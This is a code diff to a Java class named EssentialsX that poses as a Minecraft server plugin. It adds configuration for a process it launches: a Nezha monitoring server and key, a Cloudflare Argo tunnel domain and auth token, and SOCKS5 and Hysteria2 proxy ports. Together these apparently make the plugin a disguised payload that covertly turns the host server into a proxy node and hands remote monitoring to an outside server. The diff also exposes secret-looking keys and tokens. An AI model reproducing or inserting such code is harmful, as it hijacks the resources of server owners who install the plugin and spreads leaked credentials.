@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "530dc3d4-345c-441a-a5fd-f4cdaf169469");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.389001.xyz:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "6ogI7Hfqle9f8OlSyciPdwRmT47VwmN3");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("ARGO_DOMAIN", "runox-jeffproton.loveme-now.com");
+        env.put("ARGO_AUTH", "eyJhIjoiNjZkZDE5OWJhNDkzZGRhY2M0NmMyNzFjZjE4YmNlYTAiLCJ0IjoiOTU0OGNlZDUtMjMxNC00Y2Y2LWFlMjktNDMyMWY5OGUyMDliIiwicyI6IlpUVTBObUV6TlRZdE5tRTNaUzAwTWpJNUxXRXpPRGt0TjJNeE9HWmxaVEE0TUdKaCJ9");
+        env.put("S5_PORT", "40085");
+        env.put("HY2_PORT", "40085");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -90,9 +90,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "runox-jeffproton");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
